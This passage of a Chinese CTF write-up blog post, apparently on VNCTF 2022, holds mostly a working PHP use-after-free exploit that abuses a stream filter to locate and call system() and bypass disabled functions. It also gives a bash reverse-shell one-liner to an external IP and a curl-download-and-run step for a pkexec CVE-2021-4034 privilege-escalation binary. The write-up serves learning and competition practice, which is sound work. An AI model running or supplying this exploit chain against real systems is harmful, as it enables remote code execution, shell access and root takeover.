CHUNK_DATA_SIZE + <span class="number">0x20</span> : CHUNK_DATA_SIZE);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class="number">0x70</span> : <span class="number">0x50</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class="number">0x18</span> - <span class="number">1</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;CMD&#x27;</span>, <span class="variable">$cmd</span>);</span></span><br><span class="line"><span class="language-php">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$groom</span>[] = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">stream_filter_register</span>(<span class="string">&#x27;pwn_filter&#x27;</span>, <span class="string">&#x27;Pwn&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    <span class="variable">$fd</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">stream_filter_append</span>(<span class="variable">$fd</span>,<span class="string">&#x27;pwn_filter&#x27;</span>);</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">fputs</span>(<span class="variable">$fd</span>, <span class="string">&#x27;x&#x27;</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>; &#125;</span></span><br><span class="line"><span class="language-php"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span> <span class="keyword">extends</span> <span class="title">php_user_filter</span> </span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="variable">$abc</span>, <span class="variable">$abc_addr</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="variable">$helper</span>, <span class="variable">$helper_addr</span>, <span class="variable">$helper_off</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="variable">$uafp</span>, <span class="variable">$hfp</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$in</span>, <span class="variable">$out</span>, &amp;<span class="variable">$consumed</span>, <span class="variable">$closing</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(<span class="variable">$closing</span>) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">stream_bucket_make_writeable</span>(<span class="variable">$in</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;filtername = <span class="title class_">Pwn</span>::<span class="title function_ invoke__">alloc</span>(STRING_SIZE);</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;stream);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">go</span>();</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> PSFS_PASS_ON;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;abc = &amp;<span class="variable language_">$this</span>-&gt;filtername;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">make_uaf_obj</span>();</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper-&gt;b = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;&#125;;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper_addr = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE * <span class="number">2</span> - <span class="number">0x18</span>) - CHUNK_SIZE * <span class="number">2</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper @ 0x%x&quot;</span>, <span class="variable">$this</span>-&gt;helper_addr);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;abc_addr = <span class="variable language_">$this</span>-&gt;helper_addr - CHUNK_SIZE;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;abc @ 0x%x&quot;</span>, <span class="variable">$this</span>-&gt;abc_addr);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;helper_off = <span class="variable language_">$this</span>-&gt;helper_addr - <span class="variable language_">$this</span>-&gt;abc_addr - <span class="number">0x18</span>;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$helper_handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(CHUNK_SIZE);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="variable">$helper_handlers</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_leaker</span>();</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$helper_handlers</span> + <span class="number">8</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;binary leak @ 0x%x&quot;</span>, <span class="variable">$binary_leak</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">prepare_cleanup</span>(<span class="variable">$binary_leak</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$closure_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;helper_off + <span class="number">0x38</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;real closure @ 0x%x&quot;</span>, <span class="variable">$closure_addr</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$closure_ce</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="number">0x10</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="variable">$closure_ce</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$closure_ce</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="variable">$basic_funcs</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;zif_system @ 0x%x&quot;</span>, <span class="variable">$zif_system</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$fake_closure_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class="number">2</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x138</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$i</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="variable">$i</span>));</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x70</span> : <span class="number">0x68</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$handler_offset</span>, <span class="variable">$zif_system</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$fake_closure_addr</span> = <span class="variable language_">$this</span>-&gt;helper_addr + <span class="variable">$fake_closure_off</span> - <span class="variable language_">$this</span>-&gt;helper_off;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;helper_off + <span class="number">0x38</span>, <span class="variable">$fake_closure_addr</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;fake closure @ 0x%x&quot;</span>, <span class="variable">$fake_closure_addr</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanup</span>();</span></span><br><span class="line"><span class="language-php">        (<span class="variable language_">$this</span>-&gt;helper-&gt;b)(CMD);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">make_uaf_obj</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;uafp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;uafp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQQ&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xDEADBAADC0DE</span>));</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; STRING_SIZE; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;uafp, <span class="string">&quot;\x00&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_leaker</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$str_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span>, <span class="number">2</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span> + <span class="number">0x10</span>, <span class="number">6</span>);</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">        <span class="variable">$val_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + <span class="number">0x48</span>;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span>, <span class="variable">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class="number">8</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span> + <span class="number">8</span>, <span class="number">0xA</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_cleanup</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$ret_gadget</span> = <span class="variable">$binary_leak</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">do</span> &#123;</span></span><br><span class="line"><span class="language-php">            --<span class="variable">$ret_gadget</span>;</span></span><br><span class="line"><span class="language-php">        &#125; <span class="keyword">while</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$ret_gadget</span>, <span class="number">1</span>) !== <span class="number">0xC3</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;ret gadget = 0x%x&quot;</span>, <span class="variable">$ret_gadget</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0</span>, <span class="variable">$this</span>-&gt;abc_addr + <span class="number">0x20</span> - (PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x50</span> : <span class="number">0x60</span>));</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">8</span>, <span class="variable">$ret_gadget</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">16</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span></span><br><span class="line"><span class="language-php">        <span class="variable">$value</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;helper-&gt;c);</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(<span class="variable">$n</span> !== <span class="number">8</span>) &#123; <span class="variable">$value</span> &amp;= (<span class="number">1</span> &lt;&lt; (<span class="variable">$n</span> &lt;&lt; <span class="number">3</span>)) - <span class="number">1</span>; &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="variable">$value</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable language_">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span></span><br><span class="line"><span class="language-php">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span></span></span><br><span class="line"><span class="language-php">            <span class="comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span></span></span><br><span class="line"><span class="language-php">            <span class="comment">// In that case, changing the direction of the search should fix the crash.</span></span></span><br><span class="line"><span class="language-php">            <span class="comment">// $addr += 0x10;</span></span></span><br><span class="line"><span class="language-php">            <span class="variable">$addr</span> -= <span class="number">0x10</span>;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>, <span class="number">4</span>) === <span class="number">0xA8</span> &amp;&amp;</span></span><br><span class="line"><span class="language-php">                <span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">4</span>, <span class="number">4</span>),</span></span><br><span class="line"><span class="language-php">                    [<span class="number">20151012</span>, <span class="number">20160303</span>, <span class="number">20170718</span>, <span class="number">20180731</span>, <span class="number">20190902</span>, <span class="number">20200930</span>])) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="variable">$module_name_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x20</span>);</span></span><br><span class="line"><span class="language-php">                <span class="variable">$module_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$module_name_addr</span>);</span></span><br><span class="line"><span class="language-php">                <span class="keyword">if</span>(<span class="variable">$module_name</span> === <span class="number">0x647261646e617473</span>) &#123;</span></span><br><span class="line"><span class="language-php">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;standard module @ 0x%x&quot;</span>, <span class="variable">$addr</span>);</span></span><br><span class="line"><span class="language-php">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x28</span>);</span></span><br><span class="line"><span class="language-php">                &#125;</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">do</span> &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>);</span></span><br><span class="line"><span class="language-php">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$f_entry</span>, <span class="number">6</span>);</span></span><br><span class="line"><span class="language-php">            <span class="keyword">if</span>(<span class="variable">$f_name</span> === <span class="number">0x6d6574737973</span>) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span></span><br><span class="line"><span class="language-php">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> !== <span class="number">0</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanup</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable language_">$this</span>-&gt;hfp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span></span><br><span class="line"><span class="language-php">        <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;hfp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQ&#x27;</span>, <span class="number">0</span>, <span class="variable">$this</span>-&gt;abc_addr));</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; FILTER_SIZE - <span class="number">0x10</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="title function_ invoke__">fputs</span>(<span class="variable">$this</span>-&gt;hfp, <span class="string">&quot;\x00&quot;</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params"><span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$address</span> = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$n</span> - <span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$j</span>]);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="variable">$address</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$out</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span></span><br><span class="line"><span class="language-php">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="variable">$out</span>;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$val</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span>(LOGGING) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;<span class="subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="variable">$val</span>);</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params"><span class="variable">$size</span></span>) </span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">return</span> <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$size</span>));</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/1.117.144.41/4444 &lt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后pkexec提权，项目地址：<a target="_blank" rel="noopener" href="https://github.com/arthepsy/CVE-2021-4034">https://github.com/arthepsy/CVE-2021-4034</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://120.27.248.81/p &gt; ./p</span><br><span class="line"><span class="built_in">chmod</span> 777 p</span><br><span class="line">./p</span><br></pre></td></tr></table></figure>
+
+<h1 id="gocalc"><a href="#gocalc" class="headerlink" title="gocalc"></a>gocalc</h1><p>go注入未复现，待有时间接触go之后再学，直接学注入肯定效果不好。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://xianbeil.github.io/2022/04/06/vnctf2022/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/04/19/rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            rome反序列化链
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/04/06/shiro-1-cc/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
